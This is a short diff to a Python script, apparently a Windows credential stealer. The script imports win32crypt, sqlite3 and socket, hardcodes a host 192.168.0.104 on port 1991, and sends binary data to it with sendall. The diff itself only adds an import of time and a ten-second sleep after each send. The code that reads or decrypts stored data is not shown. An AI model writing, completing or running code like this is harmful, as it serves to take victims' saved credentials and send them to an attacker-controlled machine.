@@ -9,6 +9,7 @@ from os import remove
 import sqlite3
 import win32crypt
 import socket
+import time 
 
 HOST = '192.168.0.104'
 PORT = 1991
@@ -59,6 +60,8 @@ try:
             s.sendall(binary_data)
             data = s.recv(1024)
             print('Received', repr(data))
+
+        time.sleep(10)
 
         # Test local
         # if binary_data:
